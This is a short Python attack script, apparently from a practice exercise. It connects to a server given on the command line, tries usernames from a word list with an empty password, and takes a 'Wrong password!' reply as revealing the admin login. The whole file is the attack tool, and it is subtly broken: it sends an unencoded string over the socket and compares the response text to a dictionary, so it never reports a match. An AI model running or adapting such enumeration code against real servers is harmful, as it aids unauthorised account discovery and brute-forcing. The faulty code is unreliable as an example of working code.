import sys
import socket
import itertools
import json


host = sys.argv[1]
port = int(sys.argv[2])

common_logins = [
    login.rstrip() for login in list(open("logins.txt").readlines())]

client_socket = socket.socket()
address = (host, port)

state = False

client_socket.connect(address)

# Try every common login until wrong password response
for login in common_logins:
    data = json.dumps({
        "login": login,
        "password": ""
    })
    client_socket.send(data)
    response = client_socket.recv(1024).decode()
    if response == {"result": "Wrong password!"}:
        admin_login = login
        print('Admin login is: ' + admin_login)


client_socket.close()
